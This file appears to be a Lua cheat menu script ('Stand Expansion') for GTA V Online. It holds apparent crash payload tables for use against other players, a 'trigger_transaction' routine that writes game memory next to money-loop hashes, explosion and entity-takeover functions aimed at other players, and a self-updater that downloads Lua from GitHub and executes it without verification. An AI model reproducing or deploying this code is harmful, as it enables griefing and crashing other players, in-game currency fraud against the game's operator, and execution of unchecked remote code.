local func = require("NovaScript.functions")
local scripts_dir = filesystem.scripts_dir()
local scriptName = "Stand Expansion"
local myVersion = 1.14
local response = false
local toast = util.toast
require("lua_imGUI V2")
require("Universal_ped_list")
require("Universal_objects_list")
require("ImNotPastingAllThat")
require("TP_Menu_V2")
util.require_natives("2944b", "g")
util.keep_running()
json = require("json")
myUI = UI.new()
myUI2 = UI2.new()

async_http.init("raw.githubusercontent.com", '/N0mbyy/nuhuh/main/NuhUh', function(output)
    githubVersion = tonumber(output)
    response = true
    if myVersion ~= githubVersion then
        util.toast("Stand Expension updated to " ..githubVersion.. ". Update the lua to get the latest version :D")
        menu.action(menu.my_root(), "Update Lua", {}, "", function()
            async_http.init('raw.githubusercontent.com','/N0mbyy/nuhuh/main/1%20Nuh%20Uh.lua',function(a)
                local err = select(2,load(a))
                if err then
                    util.toast("Script failed to download. Please try again later. If this continues to happen then manually update via github.")
                return end
                local f = io.open(filesystem.scripts_dir()..SCRIPT_RELPATH, "wb")
                f:write(a)
                f:close()
                util.toast("Successfully updated! Restarted the lua for the update to apply <3")
                util.restart_script()
            end)
            async_http.dispatch()
        end)
    end
end, function() response = true end)
async_http.dispatch()
repeat 
    util.yield()
until response

local function pid_to_ped(pid)
    return GET_PLAYER_PED(pid)
end 

local crash_tbl = {
    "SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE",
    "6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH",
    "GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",
}

local spawned_objects = {}

local crash_tbl_2 = {
    {17, 32, 48, 69},
    {14, 30, 37, 46, 47, 63},
    {9, 27, 28, 60}
}

local icon_self = directx.create_texture(filesystem.resources_dir() .. "demo_self.png")
local icon_world = directx.create_texture(filesystem.resources_dir() .. "demo_world.png")
local icon_pepe = directx.create_texture(filesystem.resources_dir() .. "pepegrey.png")
local icons = {
    self = icon_self,
    world = icon_world,
    pepe = icon_pepe

}

local request_model_load = function(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

local resources_dir =  filesystem.resources_dir() .. '\\standexp\\'

local function playWav(wav)
    local fr = soup.FileReader(wav)
    local wav = soup.audWav(fr)
    local dev = soup.audDevice.getDefault()
    local pb = dev:open(wav.channels)
    local mix = soup.audMixer()
    mix.stop_playback_when_done = true
    mix:setOutput(pb)
    mix:playSound(wav)
    while pb:isPlaying() do util.yield() end
end

local version = "1"
local image = "DIA_VICTIM"

local user_name = players.get_name(players.user())
local plpid = PLAYER.GET_PLAYER_NAME(pid)

local menuroot = menu.my_root()
local menuAction = menu.action
local menuToggle = menu.toggle
local menuToggleLoop = menu.toggle_loop
local joaat = util.joaat
local wait = util.yield

local createPed = entities.create_ped
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
local requestModel = STREAMING.REQUEST_MODEL
local hasModelLoaded = STREAMING.HAS_MODEL_LOADED
local noNeedModel = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED
local setPedCombatAttr = PED.SET_PED_COMBAT_ATTRIBUTES
local giveWeaponToPed = WEAPON.GIVE_WEAPON_TO_PED

local objtab = {}
local vsh
local psh
local obj_shot
local function vshot(hash, camcoords, CV, rot)
    if not ENTITY.DOES_ENTITY_EXIST(vsh) then
        vsh = entities.create_vehicle(hash, camcoords, CV)
        ENTITY.SET_ENTITY_ROTATION(vsh, rot.x, rot.y, rot.z, 0, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vsh, 1000)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vsh, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vsh, true)
        table.insert(objtab, vsh)
    else
        local veh_sec = entities.create_vehicle(hash, camcoords, CV)
        ENTITY.SET_ENTITY_ROTATION(veh_sec, rot.x, rot.y, rot.z, 0, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh_sec, 1000)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vsh, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vsh, true)
        table.insert(objtab, veh_sec)
    end
end

function write_int(address, value)
    memory.write_int(memory.script_global(address), value) 
end

function trigger_transaction(hash, value)
    write_int(4536533 + 1, 2147483646)
    write_int(4536533 + 7, 2147483647)
    write_int(4536533 + 6, 0)
    write_int(4536533 + 5, 0)
    write_int(4536533 + 3, hash)
    write_int(4536533 + 2, value)
    write_int(4536533, 2)
end

local hash = {
    loop1kk = 1633116913,
    loop180k = -0x3D3A1CC7,
    loop50k = 0x610F9AB4,
    --limited
    bend_job = 0x176D9D54,
    gangops_award_mastermind_3 = 0xED97AFC1,
    job_bonus = 0xA174F633,
    daily_objective_event = 0x314FB8B0,
    business_hub_sell = 0x4B6A869C,
}


local function pshot(hash, camcoords, CV, rot)
    if not ENTITY.DOES_ENTITY_EXIST(psh) then
        psh = entities.create_ped(1, hash, camcoords, CV)
        ENTITY.SET_ENTITY_INVINCIBLE(psh, true)
        util.yield(30)
        ENTITY.SET_ENTITY_ROTATION(psh, rot.x, rot.y, rot.z, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(psh, 1, 0, 5000, 0, 0, true, true, true, true)
        table.insert(objtab, psh)
    else
        local sped = entities.create_ped(1, hash, camcoords, CV)
        ENTITY.SET_ENTITY_INVINCIBLE(sped, true)
        util.yield(30)
        ENTITY.SET_ENTITY_ROTATION(sped, rot.x, rot.y, rot.z, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(sped, 1, 0, 5000, 0, 0, true, true, true, true)
        table.insert(objtab, sped)
    end
end
local function oshot(hash, camcoords, rot)
    if not ENTITY.DOES_ENTITY_EXIST(obj_shot) then
        local objs = OBJECT.CREATE_OBJECT(hash, camcoords.x, camcoords.y, camcoords.z, true, true, true)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(objs, players.user_ped(), false)
        util.yield(20)
        ENTITY.SET_ENTITY_ROTATION(objs, rot.x, rot.y, rot.z, 0, true)
        
        ENTITY.APPLY_FORCE_TO_ENTITY(objs, 2, camcoords.x ,  15000, camcoords.z , 0, 0, 0, 0,  true, false, true, false, true)
        table.insert(objtab, objs)
        else
            local sobjs = OBJECT.CREATE_OBJECT(hash, camcoords.x, camcoords.y, camcoords.z, true, true, true)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(sobjs, players.user_ped(), false)
            util.yield(20)
            ENTITY.SET_ENTITY_ROTATION(sobjs, rot.x, rot.y, rot.z, 0, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(sobjs, 2, camcoords.x ,  15000, camcoords.z , 0, 0, 0, 0,  true, false, true, false, true)
            table.insert(objtab, sobjs)
    end
end

local function objshots(hash, obj, camcoords)
    local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
    local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        vshot(hash, camcoords, CV, rot)
        
        for i, car in ipairs(objtab) do
            if obj.expl then
                if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(car) then
                    local expcoor = ENTITY.GET_ENTITY_COORDS(car)
                    FIRE.ADD_EXPLOSION(expcoor.x, expcoor.y, expcoor.z, 81, 5000, true, false, 0.0, false)
                    entities.delete_by_handle(car)
                end
            end
            if i >= 150 then
                for index, vehs in ipairs(objtab) do
                    entities.delete_by_handle(vehs)
                    objtab ={}
                end
            end
            local carc = ENTITY.GET_ENTITY_COORDS(car)
            local tar2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, carc.x, carc.y, carc.z)
            if disbet > 15000 then
                entities.delete_by_handle(car)
            end
        end

    elseif STREAMING.IS_MODEL_A_PED(hash) then
       pshot(hash, camcoords, CV, rot)
        for i, psho in ipairs(objtab) do
        if obj.expl then
            if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(psho) then
                local expcoor = ENTITY.GET_ENTITY_COORDS(psho)
                FIRE.ADD_EXPLOSION(expcoor.x, expcoor.y, expcoor.z, 81, 5000, true, false, 0.0, false)
                entities.delete_by_handle(psho)
            end
            local pedc = ENTITY.GET_ENTITY_COORDS(psh)
            local tar2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, pedc.x, pedc.y, pedc.z)
            if disbet > 15000 then
                entities.delete_by_handle(psh)
            end
        end
        if i >= 40 then
            for index, p_shot in ipairs(objtab) do
                entities.delete_by_handle(p_shot)
                objtab ={}
            end
        end
    end
    elseif STREAMING.IS_MODEL_VALID(hash) then
    oshot(hash, camcoords, rot)
    for i, objs in ipairs(objtab) do
        if obj.expl then
            if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(objs) then
                local expcoor = ENTITY.GET_ENTITY_COORDS(objs)
                FIRE.ADD_EXPLOSION(expcoor.x, expcoor.y, expcoor.z, 81, 5000, true, false, 0.0, false)
                entities.delete_by_handle(objs)
            end
                local objc = ENTITY.GET_ENTITY_COORDS(objs)
                local tar2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, objc.x, objc.y, objc.z)
                if disbet > 15000 then
                    entities.delete_by_handle(objs)
                end
            end
            if i >= 40 then
                for index, p_shot in ipairs(objtab) do
                    entities.delete_by_handle(p_shot)
                    objtab ={}
                end
            end
        end
    end
end

function Streament(hash)
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    util.yield()
    end
end

local next_preview
local image_preview
local function rotation_to_direction(rotation)
    local adjusted_rotation =
    {
        x = (math.pi / 180) * rotation.x,
        y = (math.pi / 180) * rotation.y,
        z = (math.pi / 180) * rotation.z
    }
    local direction =
    {
        x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
        y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
        z =  math.sin(adjusted_rotation.x)
    }
    return direction
end
local function get_offset_from_camera(distance)
    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
    local cam_pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination =
    {
        x = cam_pos.x + direction.x * distance,
        y = cam_pos.y + direction.y * distance,
        z = cam_pos.z + direction.z * distance
    }
    return destination
end

local function objams(obj_hash, obj, camcoords)
    local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
    if STREAMING.IS_MODEL_A_VEHICLE(obj_hash) then
        obj.prev = VEHICLE.CREATE_VEHICLE(obj_hash, camcoords.x, camcoords.y, camcoords.z, CV, true, true, false)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj.prev, players.user_ped(), false)
      elseif STREAMING.IS_MODEL_A_PED(obj_hash) then
        obj.prev = entities.create_ped(1, obj_hash, camcoords, CV)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj.prev, players.user_ped(), false)
      elseif STREAMING.IS_MODEL_VALID(obj_hash) then
        obj.prev = OBJECT.CREATE_OBJECT(obj_hash, camcoords.x, camcoords.y, camcoords.z, true, true, true)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj.prev, players.user_ped(), false)
    end
end

SEC = ENTITY.SET_ENTITY_COORDS

local function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(pid) then util.stop_thread() end
        callback()
    end)
end

function explode(pid, type, owned)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	pos.z = pos.z-0.9
	if not owned then
		FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, type, 1000, audible, invisible, shake, false)
	else
		FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), pos.x, pos.y, pos.z, type, 1000, audible, invisible, shake, true)
	end
end

function game_notification(message)
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(image, 0)
	
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(image) do
		util.yield()
	end

	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message..".")
	
	local tittle = "Stand Expansion"
	local subtitle = "~c~Notification System"
	
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(image, image, true, 4, tittle, subtitle)
	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
end

notification = {
	['normal'] = function(message)
		if not standlike then
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
	['red'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(8)
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
    ['lightblue'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(9)
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
    ['lightred'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(7)
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
    ['grey'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(5)
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
    ['white'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(4)
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
    ['purple'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(21)
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
    ['pink'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(49)
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
    ['darkpurple'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(96)
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
    ['darkgreen'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(184)
			game_notification(message)
		else
			stand_notification(message)
		end
	end,
    ['yellow'] = function(message)
		if not standlike then
			HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(190)
			game_notification(message)
		else
			stand_notification(message)
		end
	end
    
}

util.show_corner_help('~r~Script is WIP! \n~w~Made by N0mbyy')
notification.normal("Initializing Stand Expansion...")

if players.get_rockstar_id(players.user()) == 76716180 then
    notification.normal("~g~Owner privileges recognized!\n~w~Welcome back, ~r~N0mbyy~w~!")
elseif
    players.get_rockstar_id(players.user()) == 226774243 then --Blondie
    notification.normal("~g~Admin privileges recognized!\n~w~Welcome back, ~r~Doppelmoral~w~!")
else
    util.yield(2500)
notification.normal("~g~Script successfully loaded!\n~w~Welcome back, ~r~"..user_name.."~w~!")
end

local festive_div = menu.divider(menu.my_root(), "")
local loading_frames = {"Stand Expansion", "now integrated in stand!", "finally added Auto-Update","discord.gg/fickdeinemutter", "with ImGUI Option", "onlyfans.com/joebiden", "gamesense.pub", "check our socials",}
util.create_tick_handler(function()
    for _, frame in pairs(loading_frames) do
        menu.set_menu_name(festive_div, frame)
        util.yield(2000)
    end
end)

function SE_add_explosion(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
    FIRE.ADD_EXPLOSION(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
end

function SE_add_owned_explosion(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
    FIRE.ADD_OWNED_EXPLOSION(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
end

local function getLocalPlayerCoords()
    return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()), true)
end
local function getLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

local function distanceBetweenTwoEntities(entity1, entity2)
    local v3_1 = ENTITY.GET_ENTITY_COORDS(entity1, false)
    local v3_2 = ENTITY.GET_ENTITY_COORDS(entity2, false)

    local distance = math.sqrt(((v3_2.x - v3_1.x)^2) + ((v3_2.y - v3_1.y)^2) + ((v3_2.z - v3_1.z)^2))
    return distance
end

local function distanceBetweenTwoCoords(v3_1, v3_2)
    local distance = math.sqrt(((v3_2.x - v3_1.x)^2) + ((v3_2.y - v3_1.y)^2) + ((v3_2.z - v3_1.z)^2))
    return distance
end

local function getPlayerName_ped(ped)
    local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(playerID)
    return playerName
end

local function getPlayerName_pid(pid)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(pid)
    return playerName
end

local function easeOutCubic(x)
    return 1 - ((1-x) ^ 3)
end
local function easeInCubic(x)
    return x * x * x
end
local function easeInOutCubic(x)
    if(x < 0.5) then
        return 4 * x * x * x;
    else
        return 1 - ((-2 * x + 2) ^ 3) / 2
    end
end

CCAM = 0
STP_SPEED_MODIFIER = 0.02
STP_COORD_HEIGHT = 300
local whiteText = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
function SmoothTeleportToCord(v3coords)
    local wppos = v3coords
    local localped = getPlayerPed(players.user())
    if wppos ~= nil then 
        if not CAM.DOES_CAM_EXIST(CCAM) then
            CAM.DESTROY_ALL_CAMS(true)
            CCAM = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
            CAM.SET_CAM_ACTIVE(CCAM, true)
            CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
        end

        local pc = getEntityCoords(getPlayerPed(players.user()))

        for i = 0, 1, STP_SPEED_MODIFIER do 
            CAM.SET_CAM_COORD(CCAM, pc.x, pc.y, pc.z + easeOutCubic(i) * STP_COORD_HEIGHT)
            directx.draw_text(0.5, 0.5, tostring(easeOutCubic(i) * STP_COORD_HEIGHT), 1, 0.6, whiteText, false)
            local look = util.v3_look_at(CAM.GET_CAM_COORD(CCAM), pc)
            CAM.SET_CAM_ROT(CCAM, look.x, look.y, look.z, 2)
            wait()
        end
        local currentZ = CAM.GET_CAM_COORD(CCAM).z
        local coordDiffx = wppos.x - pc.x
        local coordDiffxy = wppos.y - pc.y
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do 
            CAM.SET_CAM_COORD(CCAM, pc.x + (easeInOutCubic(i) * coordDiffx), pc.y + (easeInOutCubic(i) * coordDiffxy), currentZ)
            wait()
        end

        local success, ground_z
        repeat
            STREAMING.REQUEST_COLLISION_AT_COORD(wppos.x, wppos.y, wppos.z)
            success, ground_z = util.get_ground_z(wppos.x, wppos.y)
            util.yield()
        until success
        if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then 
            ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, ground_z, false, false, false, false) 
        else
            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
            local v3Out = memory.alloc()
            local headOut = memory.alloc()
            PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(wppos.x, wppos.y, ground_z, v3Out, headOut, 1, 3.0, 0)
            local head = memory.read_float(headOut)
            memory.free(headOut)
            memory.free(v3Out)
            ENTITY.SET_ENTITY_COORDS(veh, wppos.x, wppos.y, ground_z, false, false, false, false) 
            ENTITY.SET_ENTITY_HEADING(veh, head)
        end
        wait()
        local pc2 = getEntityCoords(getPlayerPed(players.user()))
        local coordDiffz = CAM.GET_CAM_COORD(CCAM).z - pc2.z
        local camcoordz = CAM.GET_CAM_COORD(CCAM).z

        for i = 0, 1, STP_SPEED_MODIFIER / 2 do 
            local pc23 = getEntityCoords(getPlayerPed(players.user()))
            CAM.SET_CAM_COORD(CCAM, pc23.x, pc23.y, camcoordz - (easeOutCubic(i) * coordDiffz))
            wait()
        end
        wait()
        CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
        if CAM.IS_CAM_ACTIVE(CCAM) then
            CAM.SET_CAM_ACTIVE(CCAM, false)
        end
        CAM.DESTROY_CAM(CCAM, true)
    else
        util.toast("No waypoint set!")
    end
end

function SmoothTeleportToVehicle(pedInVehicle)
    local wppos = getEntityCoords(pedInVehicle)
    local localped = getPlayerPed(players.user())
    local maxPassengers = VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(veh)
    local seatFree = false
    local continueQ
    local veh = PED.GET_VEHICLE_PED_IS_IN(pedInVehicle, false)
    for i = -1, maxPassengers do 
        seatFree = VEHICLE.IS_VEHICLE_SEAT_FREE(veh, i, false)
        if seatFree then
            continueQ = true
        end
    end
    if seatFree == false then
        util.toast("No seats available in said vehicle.")
        continueQ = false
    end
    -- > --
    if wppos ~= nil then 
        if not CAM.DOES_CAM_EXIST(CCAM) then
            CAM.DESTROY_ALL_CAMS(true)
            CCAM = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
            CAM.SET_CAM_ACTIVE(CCAM, true)
            CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
        end
        --
        local pc = getEntityCoords(getPlayerPed(players.user()))
        --
        for i = 0, 1, STP_SPEED_MODIFIER do 
            CAM.SET_CAM_COORD(CCAM, pc.x, pc.y, pc.z + easeOutCubic(i) * STP_COORD_HEIGHT)
            directx.draw_text(0.5, 0.5, tostring(easeOutCubic(i) * STP_COORD_HEIGHT), 1, 0.6, whiteText, false)
            local look = util.v3_look_at(CAM.GET_CAM_COORD(CCAM), pc)
            CAM.SET_CAM_ROT(CCAM, look.x, look.y, look.z, 2)
            wait()
        end
        local currentZ = CAM.GET_CAM_COORD(CCAM).z
        local coordDiffx = wppos.x - pc.x
        local coordDiffxy = wppos.y - pc.y
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do
            CAM.SET_CAM_COORD(CCAM, pc.x + (easeInOutCubic(i) * coordDiffx), pc.y + (easeInOutCubic(i) * coordDiffxy), currentZ)
            wait()
        end
        PED.SET_PED_INTO_VEHICLE(localped, veh, i)
        if continueQ then
            wait()
            local pc2 = getEntityCoords(getPlayerPed(players.user()))
            local coordDiffz = CAM.GET_CAM_COORD(CCAM).z - pc2.z
            local camcoordz = CAM.GET_CAM_COORD(CCAM).z
            for i = 0, 1, STP_SPEED_MODIFIER / 2 do 
                local pc23 = getEntityCoords(pedInVehicle)
                CAM.SET_CAM_COORD(CCAM, pc23.x, pc23.y, camcoordz - (easeOutCubic(i) * coordDiffz))
                wait()
            end
        end
        wait()
        CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
        if CAM.IS_CAM_ACTIVE(CCAM) then
            CAM.SET_CAM_ACTIVE(CCAM, false)
        end
        CAM.DESTROY_CAM(CCAM, true)
    else
        util.toast("No waypoint set!")
    end
end

local function onStartup()
    SE_impactinvismines = memory.alloc()
    SE_pImpactCoord = memory.alloc()
    SE_LocalPed = getLocalPed()
    SE_Notifications = false

    SE_ArrayList = false
    SE_ArrayCount = 0 
    SE_ArrayOffsetX = 0.0
    SE_ArrayOffsetY = 0.0
    SE_ArrayScale = 0.3
    SE_ArrayColor = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}

end

onStartup()

local function fastNet(entity, playerID)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
        for i = 1, 30 do
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                wait(10)
            else
                goto continue
            end    
        end
    end
    ::continue::
    if SE_Notifications then
        util.toast("Has control.")
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    wait(10)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerID, true)
    wait(10)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    wait(10)
    ENTITY._SET_ENTITY_CLEANUP_BY_ENGINE(entity, false)
    wait(10)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    wait(10)
    if BA_visible then
        ENTITY.SET_ENTITY_VISIBLE(entity, true, 0)
    else
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
    end
end

local function netIt(entity, playerID)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
        for i = 1, 100 do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        wait(50)
        end
    else
        if SE_Notifications then
            util.toast("Has control.")
        end
    end
    wait(10)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    wait(10)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerID, true)
    wait(10)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    wait(10)
    ENTITY._SET_ENTITY_CLEANUP_BY_ENGINE(entity, false)
    wait(10)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    wait(10)
    if BA_visible then
        ENTITY.SET_ENTITY_VISIBLE(entity, true, 0)
    else
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
    end
end

local function netItAll(entity)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
        for i = 1, 100 do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        wait(50)
        end
    else
        if SE_Notifications then
            util.toast("Has control.")
        end
    end
    wait(10)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    wait(10)
    for i = 0, 31, 1 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, i, true)
            wait(10)
        end
    end
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    wait(10)
    ENTITY._SET_ENTITY_CLEANUP_BY_ENGINE(entity, false)
    wait(10)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    wait(10)
    if BA_visible then
        ENTITY.SET_ENTITY_VISIBLE(entity, true, 0)
    else
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
    end
end

local function get_waypoint_pos2()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
        return waypoint_pos
    else
        util.toast("NO_WAYPOINT_SET")
    end
end

local function getClosestPlayerWithRange(range)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = getEntityCoords(getLocalPed())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            tbl[#tbl+1] = entities.pointer_to_handle(pedPointers[i])
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= getLocalPed() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = getEntityCoords(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end

